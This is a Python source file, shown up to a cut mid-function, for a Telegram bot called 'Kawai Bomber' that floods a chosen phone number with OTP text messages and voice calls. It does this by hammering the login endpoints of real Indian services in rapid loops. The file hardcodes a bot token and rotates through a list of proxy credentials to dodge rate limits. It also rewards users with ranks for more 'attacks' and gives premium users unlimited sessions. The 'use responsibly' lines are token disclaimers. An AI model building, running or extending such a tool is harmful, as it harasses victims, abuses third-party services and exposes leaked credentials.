import asyncio
import aiohttp
import json
import random
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Set, Optional
from collections import defaultdict
import os
import sys

# Telegram Bot Imports
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    ConversationHandler
)
from telegram.constants import ParseMode
from telegram.error import InvalidToken, NetworkError

# ==================== CONFIGURATION ====================
# Use environment variable for token, fallback to hardcoded
BOT_TOKEN = os.getenv("BOT_TOKEN", "8165905656:AAH-rzFBoBCdKMb9A-wv2hx0Hm9RgvGa8m0")
ADMIN_IDS = {8291098446}  # Your user ID
APPROVED_USERS = set()
BANNED_USERS = set()
USER_DB = {}

# Conversation states
PHONE, CONFIRM, BOMB_TYPE = range(3)

# Anime-inspired emojis
EMOJIS = {
    "bomb": "💣", "phone": "📱", "call": "📞", "sms": "💬", "fire": "🔥",
    "rocket": "🚀", "warning": "⚠️", "success": "✅", "error": "❌",
    "clock": "⏰", "stats": "📊", "admin": "👑", "user": "👤", "ban": "🚫",
    "unban": "🔓", "settings": "⚙️", "power": "⚡", "heart": "❤️",
    "star": "⭐", "flower": "🌸", "sparkles": "✨", "zap": "⚡",
    "boom": "💥", "cyclone": "🌀", "dizzy": "💫", "shield": "🛡️",
    "crown": "👑", "tada": "🎉", "confetti": "🎊", "sparkle": "❇️",
    "ring": "💍", "gem": "💎", "trophy": "🏆", "medal": "🏅",
    "target": "🎯", "speed": "⚡", "bar_chart": "📈", "list": "📋",
    "working": "🟢", "rotation": "🔄", "api": "🔌", "server": "🖥️",
    "cpu": "🧠", "memory": "💾", "disk": "💿", "os": "💻", "python": "🐍",
    "help": "❓", "activity": "📈", "total": "🔢", "sessions": "🔄",
    "proxy": "🛡️", "rank": "🏅", "level": "📊", "premium": "⭐",
    "permissions": "🔐", "limit": "⏳", "broadcast": "📢", "quick": "⚡"
}

# ASCII Art Banner
BANNER = r"""
╔═══╗╔╗    ╔═══╗╔╗ ╔╗╔════╗╔═══╗╔═══╗╔═══╗
║╔═╗║║║    ║╔══╝║║ ║║╚══╗═║║╔══╝║╔═╗║║╔══╝
║║ ╚╝║║    ║╚══╗║║ ║║  ╔╝╔╝║╚══╗║║ ║║║╚══╗
║║╔═╗║║ ╔╗ ║╔══╝║║ ║║ ╔╝╔╝ ║╔══╝║║ ║║║╔══╝
║╚╩═║║╚═╝║ ║╚══╗║╚═╝║╔╝═╚═╗║╚══╗║╚═╝║║╚══╗
╚═══╝╚═══╝ ╚═══╝╚═══╝╚════╝╚═══╝╚═══╝╚═══╝
"""

# Proxy List
PROXY_LIST = [
    "px711001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043006.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1160303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1400403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px022409.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013304.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px390501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px060301.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px014236.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px950403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px340403.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016008.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px1210303.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px173003.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px500401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px710701.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px041202.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px040805.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px580801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px510201.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px990502.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px043004.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px810503.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px031901.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px210404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px100801.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px031901.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px730503.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px350401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px130501.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px380101.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px090404.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px490401.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px220601.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px410701.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px013401.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px052001.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016007.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px1390303.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px016007.pointtoserver.com:10780:ppurevpn0s12840722:vkgp6joz",
    "px121102.pointtoserver.com:10780:purevpn0s12840722:vkgp6joz",
    "px390501.pointtoserver.com:10780:purevpn0s12840722:vkgp6jo",
]

# API Endpoints (Aggressive version)
APIS = [
    # SMS APIs
    {
        "name": "Hungama",
        "endpoint": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "type": "sms",
        "payload": {"mobileNo": "{phone}", "countryCode": "+91"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Meru Cab",
        "endpoint": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "type": "sms",
        "payload": {"mobile_number": "{phone}"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Dayco India",
        "endpoint": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "type": "sms",
        "payload": {"api": "send_otp", "brand": "dayco", "mob": "{phone}"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    {
        "name": "Doubtnut",
        "endpoint": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "type": "sms",
        "payload": {"phone_number": "{phone}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "NoBroker",
        "endpoint": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "type": "sms",
        "payload": {"phone": "{phone}", "countryCode": "IN"},
        "headers": {"Content-Type": "application/x-www-form-urlencoded"}
    },
    # Call APIs
    {
        "name": "Tata Capital",
        "endpoint": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "type": "call",
        "payload": {"phone": "{phone}", "isOtpViaCallAtLogin": "true"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "1mg Pharmacy",
        "endpoint": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "type": "call",
        "payload": {"number": "{phone}", "otp_on_call": True},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Swiggy",
        "endpoint": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "type": "call",
        "payload": {"mobile": "{phone}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Shiprocket",
        "endpoint": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "type": "sms",
        "payload": {"mobileNumber": "{phone}"},
        "headers": {"Content-Type": "application/json"}
    },
    {
        "name": "Physics Wallah",
        "endpoint": "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
        "method": "POST",
        "type": "call",
        "payload": {"mobile": "{phone}"},
        "headers": {"Content-Type": "application/json"}
    },
]

# ==================== GLOBAL VARIABLES ====================
active_bombs = {}
user_stats = defaultdict(lambda: {
    "sms_count": 0,
    "call_count": 0,
    "total_sessions": 0,
    "last_active": datetime.now()
})
bot_stats = {
    "total_users": 0,
    "active_bombs": 0,
    "total_sms": 0,
    "total_calls": 0,
    "total_sessions": 0,
    "uptime": datetime.now(),
    "start_time": datetime.now()
}

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self, proxies):
        self.proxies = proxies
        self.index = 0
        
    def get_proxy(self):
        """Get next proxy with authentication"""
        if not self.proxies:
            return None
            
        proxy_str = self.proxies[self.index]
        self.index = (self.index + 1) % len(self.proxies)
        
        try:
            # Format: host:port:username:password
            parts = proxy_str.split(":")
            if len(parts) == 4:
                host, port, username, password = parts
                return f"http://{username}:{password}@{host}:{port}"
            else:
                return None
        except:
            return None
    
    def get_random_proxy(self):
        """Get random proxy"""
        if not self.proxies:
            return None
        proxy_str = random.choice(self.proxies)
        try:
            parts = proxy_str.split(":")
            if len(parts) == 4:
                host, port, username, password = parts
                return f"http://{username}:{password}@{host}:{port}"
        except:
            pass
        return None

proxy_manager = ProxyManager(PROXY_LIST)

# ==================== BOMBING ENGINE ====================
class BombingEngine:
    def __init__(self, phone_number, user_id, bomb_type="sms"):
        self.phone_number = phone_number
        self.user_id = user_id
        self.bomb_type = bomb_type
        self.running = False
        self.start_time = None
        self.sent_count = 0
        self.failed_count = 0
        self.active_apis = []
        
    async def start(self, duration_minutes=60):
        """Start bombing session"""
        self.running = True
        self.start_time = datetime.now()
        
        # Filter APIs based on type
        if self.bomb_type == "sms":
            self.active_apis = [api for api in APIS if api["type"] == "sms"]
        elif self.bomb_type == "call":
            self.active_apis = [api for api in APIS if api["type"] == "call"]
        else:  # both
            self.active_apis = APIS
        
        # Calculate end time
        end_time = None
        if duration_minutes > 0:
            end_time = self.start_time + timedelta(minutes=duration_minutes)
        
        # Create bombing tasks
        tasks = []
        for api in self.active_apis:
            task = asyncio.create_task(self._attack_loop(api, end_time))
            tasks.append(task)
        
        # Wait for tasks or timeout
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        
        self.running = False
        return self.sent_count
    
    async def _attack_loop(self, api, end_time):
        """Continuous attack loop for specific API"""
        while self.running:
            # Check time limit
            if end_time and datetime.now() >= end_time:
                break
                
            try:
                success = await self._send_request(api)
                if success:
                    self.sent_count += 1
                    # Update stats
                    if api["type"] == "sms":
                        user_stats[self.user_id]["sms_count"] += 1
                        bot_stats["total_sms"] += 1
                    else:
                        user_stats[self.user_id]["call_count"] += 1
                        bot_stats["total_calls"] += 1
                
                # Aggressive delay (very fast)
                await asyncio.sleep(random.uniform(0.05, 0.15))
                
            except Exception as e:
                self.failed_count += 1
                await asyncio.sleep(0.1)
    
    async def _send_request(self, api):
        """Send request with proxy rotation"""
        try:
            proxy = proxy_manager.get_random_proxy()
            timeout = aiohttp.ClientTimeout(total=2)
            
            # Prepare headers
            headers = api.get("headers", {}).copy()
            headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
            
            # Prepare payload
            payload = {}
            for key, value in api["payload"].items():
                if isinstance(value, str) and "{phone}" in value:
                    payload[key] = value.replace("{phone}", self.phone_number)
                else:
                    payload[key] = value
            
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(
                connector=connector,
                timeout=timeout
            ) as session:
                
                if api["method"] == "POST":
                    if headers.get("Content-Type", "").startswith("application/x-www-form-urlencoded"):
                        data = aiohttp.FormData()
                        for k, v in payload.items():
                            data.add_field(k, str(v))
                        
                        async with session.post(
                            api["endpoint"],
                            data=data,
                            headers=headers,
                            proxy=proxy
                        ) as response:
                            return response.status in [200, 201, 202]
                    else:
                        async with session.post(
                            api["endpoint"],
                            json=payload,
                            headers=headers,
                            proxy=proxy
                        ) as response:
                            return response.status in [200, 201, 202]
                else:
                    async with session.get(
                        api["endpoint"],
                        headers=headers,
                        proxy=proxy
                    ) as response:
                        return response.status in [200, 201, 202]
                        
        except:
            return False
    
    def stop(self):
        """Stop bombing"""
        self.running = False
    
    def get_stats(self):
        """Get current stats"""
        if not self.start_time:
            return {"sent": 0, "failed": 0, "duration": 0}
        
        duration = (datetime.now() - self.start_time).total_seconds()
        return {
            "sent": self.sent_count,
            "failed": self.failed_count,
            "duration": duration,
            "active_apis": len(self.active_apis)
        }

# ==================== TELEGRAM BOT FUNCTIONS ====================
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command with anime interface"""
    user_id = update.effective_user.id
    username = update.effective_user.username or update.effective_user.first_name
    
    # Check if banned
    if user_id in BANNED_USERS:
        await update.message.reply_text(
            f"{EMOJIS['ban']} <b>You are banned from using this bot!</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    # Register user
    if user_id not in USER_DB:
        USER_DB[user_id] = {
            "username": username,
            "join_date": datetime.now(),
            "is_premium": user_id in APPROVED_USERS
        }
        bot_stats["total_users"] = len(USER_DB)
    
    # Create welcome message
    welcome_text = f"""
{EMOJIS['sparkles']} <b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['crown']} <b>Kawai Bomber v2.0</b> {EMOJIS['crown']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['flower']} <b>Welcome, {username}!</b> {EMOJIS['flower']}

{EMOJIS['zap']} <b>Ultra-Fast Bombing Engine</b>
{EMOJIS['shield']} <b>Proxy Rotation (40+ proxies)</b>
{EMOJIS['clock']} <b>Smart Time Management</b>
{EMOJIS['trophy']} <b>Real-time Statistics</b>

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['star']} <b>Available Commands:</b>
• /bomb - Start bombing session
• /stop - Stop active bombing
• /status - View bot statistics
• /mystats - Your personal stats
• /help - Show help menu

{EMOJIS['warning']} <b>Important:</b> Use responsibly!

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['heart']} <i>Made by @zerocyph</i>
{EMOJIS['power']} <i>Powered by Kawai Technology</i>
"""
    
    # Create keyboard
    keyboard = [
        [
            InlineKeyboardButton(f"{EMOJIS['bomb']} Start Bombing", callback_data="start_bomb"),
            InlineKeyboardButton(f"{EMOJIS['stats']} Stats", callback_data="show_stats")
        ],
        [
            InlineKeyboardButton(f"{EMOJIS['help']} Help", callback_data="help_menu"),
            InlineKeyboardButton(f"{EMOJIS['settings']} Settings", callback_data="settings")
        ]
    ]
    
    # Add admin panel for admins
    if user_id in ADMIN_IDS:
        keyboard.append([
            InlineKeyboardButton(f"{EMOJIS['admin']} Admin Panel", callback_data="admin_panel")
        ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        welcome_text,
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start bombing conversation"""
    user_id = update.effective_user.id
    
    if user_id in BANNED_USERS:
        await update.message.reply_text(
            f"{EMOJIS['ban']} <b>You are banned!</b>",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END
    
    if user_id in active_bombs:
        await update.message.reply_text(
            f"{EMOJIS['warning']} <b>You already have an active bombing session!</b>\n"
            f"Use /stop to stop it first.",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END
    
    await update.message.reply_text(
        f"{EMOJIS['phone']} <b>Enter target phone number (10 digits, without +91):</b>\n\n"
        f"{EMOJIS['warning']} Example: <code>9876543210</code>",
        parse_mode=ParseMode.HTML
    )
    
    return PHONE

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle phone number input"""
    phone = update.message.text.strip()
    
    # Validate phone
    if not phone.isdigit() or len(phone) != 10:
        await update.message.reply_text(
            f"{EMOJIS['error']} <b>Invalid phone number!</b>\n"
            f"Please enter 10 digits without +91.\n\n"
            f"Try again:",
            parse_mode=ParseMode.HTML
        )
        return PHONE
    
    context.user_data["phone"] = phone
    
    # Ask for confirmation
    keyboard = [
        [
            InlineKeyboardButton(f"{EMOJIS['success']} Confirm", callback_data="confirm_yes"),
            InlineKeyboardButton(f"{EMOJIS['error']} Cancel", callback_data="confirm_no")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"{EMOJIS['warning']} <b>Confirm Target:</b>\n"
        f"<code>{phone}</code>\n\n"
        f"{EMOJIS['fire']} <b>Proceed with bombing?</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    return CONFIRM

async def handle_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle confirmation"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "confirm_no":
        await query.edit_message_text(
            f"{EMOJIS['success']} <b>Bombing cancelled!</b>",
            parse_mode=ParseMode.HTML
        )
        return ConversationHandler.END
    
    # Show bombing type selection
    keyboard = [
        [
            InlineKeyboardButton(f"{EMOJIS['sms']} SMS Only", callback_data="type_sms"),
            InlineKeyboardButton(f"{EMOJIS['call']} Call Only", callback_data="type_call")
        ],
        [
            InlineKeyboardButton(f"{EMOJIS['fire']} Both", callback_data="type_both"),
            InlineKeyboardButton(f"{EMOJIS['zap']} Extreme", callback_data="type_extreme")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"{EMOJIS['bomb']} <b>Select Attack Mode:</b>\n\n"
        f"{EMOJIS['sms']} <b>SMS Only</b> - Send SMS bomb\n"
        f"{EMOJIS['call']} <b>Call Only</b> - Make calls only\n"
        f"{EMOJIS['fire']} <b>Both</b> - SMS + Calls\n"
        f"{EMOJIS['zap']} <b>Extreme</b> - Maximum aggression",
        parse_mode=ParseMode.HTML,
        reply_markup=reply_markup
    )
    
    return BOMB_TYPE

async def handle_bomb_type(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle bombing type selection"""
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    phone = context.user_data["phone"]
    bomb_type = query.data.replace("type_", "")
    
    # Calculate duration (0 = unlimited for approved/admins)
    if user_id in ADMIN_IDS or user_id in APPROVED_USERS:
        duration = 0
        duration_text = "∞ (Unlimited)"
    else:
        duration = 60  # 1 hour
        duration_text = "60 minutes"
    
    # Map bomb types
    type_map = {
        "sms": "SMS Only",
        "call": "Call Only",
        "both": "SMS + Call",
        "extreme": "Extreme Mode"
    }
    
    # Create bombing engine
    engine = BombingEngine(phone, user_id, bomb_type)
    
    # Store in active bombs
    active_bombs[user_id] = {
        "engine": engine,
        "phone": phone,
        "start_time": datetime.now(),
        "type": bomb_type,
        "chat_id": update.effective_chat.id,
        "message_id": query.message.message_id
    }
    
    bot_stats["active_bombs"] += 1
    bot_stats["total_sessions"] += 1
    user_stats[user_id]["total_sessions"] += 1
    user_stats[user_id]["last_active"] = datetime.now()
    
    # Start bombing in background
    asyncio.create_task(_run_bombing_session(user_id, engine, duration))
    
    # Send initial status
    status_text = f"""
{EMOJIS['rocket']} <b>⚡ BOMBING INITIATED ⚡</b>

{EMOJIS['target']} <b>Target:</b> <code>{phone}</code>
{EMOJIS['bomb']} <b>Mode:</b> {type_map[bomb_type]}
{EMOJIS['clock']} <b>Duration:</b> {duration_text}
{EMOJIS['proxy']} <b>Proxies:</b> {len(PROXY_LIST)} active
{EMOJIS['api']} <b>APIs:</b> {len(engine.active_apis)}

{EMOJIS['zap']} <b>Status:</b> <i>Starting attack sequence...</i>

{EMOJIS['warning']} Use /stop to end bombing
"""
    
    await query.edit_message_text(
        status_text,
        parse_mode=ParseMode.HTML
    )
    
    # Start live updates
    asyncio.create_task(_update_live_stats(user_id, context))
    
    return ConversationHandler.END

async def _run_bombing_session(user_id: int, engine: BombingEngine, duration: int):
    """Run bombing session with time limit"""
    try:
        await engine.start(duration)
    except Exception as e:
        print(f"Bombing error for user {user_id}: {e}")
    finally:
        # Clean up
        if user_id in active_bombs:
            bot_stats["active_bombs"] = max(0, bot_stats["active_bombs"] - 1)
            if user_id in active_bombs:
                del active_bombs[user_id]

async def _update_live_stats(user_id: int, context: ContextTypes.DEFAULT_TYPE):
    """Update live bombing stats"""
    while user_id in active_bombs:
        try:
            bomb_info = active_bombs[user_id]
            engine = bomb_info["engine"]
            stats = engine.get_stats()
            
            # Calculate speed
            if stats["duration"] > 0:
                speed = stats["sent"] / stats["duration"]
            else:
                speed = 0
            
            # Create progress bar
            progress = min(stats["sent"] / 50, 1.0)
            bar_length = 10
            filled = int(bar_length * progress)
            bar = "█" * filled + "░" * (bar_length - filled)
            
            # Update message
            status_text = f"""
{EMOJIS['rocket']} <b>⚡ LIVE BOMBING ⚡</b>

{EMOJIS['target']} <b>Target:</b> <code>{bomb_info['phone']}</code>
{EMOJIS['clock']} <b>Time:</b> {int(stats['duration'])}s

{EMOJIS['bar_chart']} <b>Progress:</b> [{bar}]

{EMOJIS['stats']} <b>Statistics:</b>
├─ {EMOJIS['success']} <b>Hits:</b> {stats['sent']}
├─ {EMOJIS['error']} <b>Misses:</b> {stats['failed']}
├─ {EMOJIS['speed']} <b>Speed:</b> {speed:.1f}/s
└─ {EMOJIS['api']} <b>APIs:</b> {stats['active_apis']}

{EMOJIS['warning']} Use /stop to end
"""
            
            try:
                await context.bot.edit_message_text(
                    chat_id=bomb_info["chat_id"],
                    message_id=bomb_info["message_id"],
                    text=status_text,
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
            
            await asyncio.sleep(3)
            
        except Exception as e:
            break

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop active bombing"""
    user_id = update.effective_user.id
    
    if user_id not in active_bombs:
        await update.message.reply_text(
            f"{EMOJIS['warning']} <b>No active bombing session!</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    bomb_info = active_bombs[user_id]
    engine = bomb_info["engine"]
    stats = engine.get_stats()
    
    # Stop engine
    engine.stop()
    
    # Send summary
    summary_text = f"""
{EMOJIS['success']} <b>BOMBING COMPLETED</b> {EMOJIS['success']}

{EMOJIS['target']} <b>Target:</b> <code>{bomb_info['phone']}</code>
{EMOJIS['clock']} <b>Duration:</b> {int(stats['duration'])}s

{EMOJIS['trophy']} <b>Results:</b>
├─ {EMOJIS['success']} <b>Successful:</b> {stats['sent']}
├─ {EMOJIS['error']} <b>Failed:</b> {stats['failed']}
├─ {EMOJIS['total']} <b>Total:</b> {stats['sent'] + stats['failed']}
└─ {EMOJIS['api']} <b>APIs Used:</b> {stats['active_apis']}

{EMOJIS['fire']} <b>Attack completed successfully!</b>
"""
    
    await update.message.reply_text(
        summary_text,
        parse_mode=ParseMode.HTML
    )
    
    # Clean up
    if user_id in active_bombs:
        bot_stats["active_bombs"] = max(0, bot_stats["active_bombs"] - 1)
        del active_bombs[user_id]

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot status"""
    uptime = datetime.now() - bot_stats["uptime"]
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours}h {minutes}m {seconds}s"
    
    status_text = f"""
{EMOJIS['stats']} <b>📊 KAWAI BOMBER STATUS 📊</b>
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['server']} <b>System Status:</b>
├─ {EMOJIS['clock']} <b>Uptime:</b> {uptime_str}
├─ {EMOJIS['activity']} <b>Active Bombs:</b> {bot_stats['active_bombs']}
└─ {EMOJIS['users']} <b>Total Users:</b> {bot_stats['total_users']}

{EMOJIS['bomb']} <b>Attack Statistics:</b>
├─ {EMOJIS['sms']} <b>Total SMS:</b> {bot_stats['total_sms']}
├─ {EMOJIS['call']} <b>Total Calls:</b> {bot_stats['total_calls']}
├─ {EMOJIS['total']} <b>Total Requests:</b> {bot_stats['total_sms'] + bot_stats['total_calls']}
└─ {EMOJIS['sessions']} <b>Total Sessions:</b> {bot_stats['total_sessions']}

{EMOJIS['proxy']} <b>Proxy System:</b>
├─ {EMOJIS['list']} <b>Total Proxies:</b> {len(PROXY_LIST)}
└─ {EMOJIS['rotation']} <b>Rotation:</b> Active

{EMOJIS['api']} <b>API Endpoints:</b>
├─ {EMOJIS['sms']} <b>SMS APIs:</b> {len([a for a in APIS if a['type'] == 'sms'])}
├─ {EMOJIS['call']} <b>Call APIs:</b> {len([a for a in APIS if a['type'] == 'call'])}
└─ {EMOJIS['total']} <b>Total APIs:</b> {len(APIS)}

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['heart']} <i>Made by @zerocyph</i>
{EMOJIS['power']} <i>Powered by Kawai Technology</i>
"""
    
    await update.message.reply_text(
        status_text,
        parse_mode=ParseMode.HTML
    )

async def mystats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show user stats"""
    user_id = update.effective_user.id
    stats = user_stats[user_id]
    
    total_attacks = stats["sms_count"] + stats["call_count"]
    
    # Calculate level
    if total_attacks < 50:
        level = "🌱 Beginner"
    elif total_attacks < 200:
        level = "🔥 Warrior"
    elif total_attacks < 500:
        level = "⚡ Champion"
    else:
        level = "👑 Legend"
    
    mystats_text = f"""
{EMOJIS['sparkles']} <b>YOUR STATISTICS</b> {EMOJIS['sparkles']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['user']} <b>User Info:</b>
├─ {EMOJIS['level']} <b>Level:</b> {level}
├─ {EMOJIS['sessions']} <b>Sessions:</b> {stats['total_sessions']}
└─ {EMOJIS['status']} <b>Status:</b> {'Premium' if user_id in APPROVED_USERS else 'Free'}

{EMOJIS['attack']} <b>Attack History:</b>
├─ {EMOJIS['sms']} <b>SMS Sent:</b> {stats['sms_count']}
├─ {EMOJIS['call']} <b>Calls Made:</b> {stats['call_count']}
└─ {EMOJIS['total']} <b>Total Attacks:</b> {total_attacks}

{EMOJIS['permissions']} <b>Permissions:</b>
├─ {EMOJIS['admin']} <b>Admin:</b> {'Yes' if user_id in ADMIN_IDS else 'No'}
├─ {EMOJIS['premium']} <b>Premium:</b> {'Yes' if user_id in APPROVED_USERS else 'No'}
└─ {EMOJIS['limit']} <b>Time Limit:</b> {'None' if user_id in APPROVED_USERS else '60 min'}

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['fire']} <i>Keep bombing to increase your rank!</i>
"""
    
    await update.message.reply_text(
        mystats_text,
        parse_mode=ParseMode.HTML
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help"""
    help_text = f"""
{EMOJIS['help']} <b>KAWAI BOMBER HELP</b> {EMOJIS['help']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['commands']} <b>Commands:</b>
• /start - Start bot
• /bomb - Start bombing
• /stop - Stop bombing
• /status - Bot statistics
• /mystats - Your statistics
• /help - This message

{EMOJIS['warning']} <b>Important:</b>
• Free users: 60-minute limit
• Premium users: Unlimited time
• Use responsibly
• Don't target unauthorized numbers

{EMOJIS['features']} <b>Features:</b>
• Fast bombing engine
• Proxy rotation
• SMS & Call bombing
• Real-time stats
• User ranking

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['heart']} <i>Made by @zerocyph</i>
"""
    
    await update.message.reply_text(
        help_text,
        parse_mode=ParseMode.HTML
    )

# ==================== ADMIN COMMANDS ====================
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin panel"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{EMOJIS['error']} <b>Access denied!</b>",
            parse_mode=ParseMode.HTML
        )
        return
    
    admin_text = f"""
{EMOJIS['admin']} <b>ADMIN CONTROL PANEL</b> {EMOJIS['admin']}
<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>

{EMOJIS['stats']} <b>System Stats:</b>
├─ {EMOJIS['users']} <b>Users:</b> {len(USER_DB)}
├─ {EMOJIS['active']} <b>Active Bombs:</b> {len(active_bombs)}
├─ {EMOJIS['approved']} <b>Approved Users:</b> {len(APPROVED_USERS)}
└─ {EMOJIS['banned']} <b>Banned Users:</b> {len(BANNED_USERS)}

{EMOJIS['commands']} <b>Admin Commands:</b>
• /addadmin <id> - Add admin
• /removeadmin <id> - Remove admin
• /approve <id> - Approve user
• /removeuser <id> - Remove approval
• /ban <id> - Ban user
• /unban <id> - Unban user
• /broadcast <msg> - Broadcast
• /sysinfo - System info

<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>
{EMOJIS['warning']} <i>Use commands responsibly!</i>
"""
    
    await update.message.reply_text(
        admin_text,
        parse_mode=ParseMode.HTML
    )

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add admin"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /addadmin <user_id>")
        return
    
    try:
        new_admin = int(context.args[0])
        ADMIN_IDS.add(new_admin)
        await update.message.reply_text(
            f"{EMOJIS['success']} Added user {new_admin} as admin!"
        )
    except:
        await update.message.reply_text(f"{EMOJIS['error']} Invalid user ID!")

async def removeadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove admin"""
    user_id = update.effective_user.id
    
    if user_id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /removeadmin <user_id>")
        return
    
    try:
        admin_id = int(context.args[0])
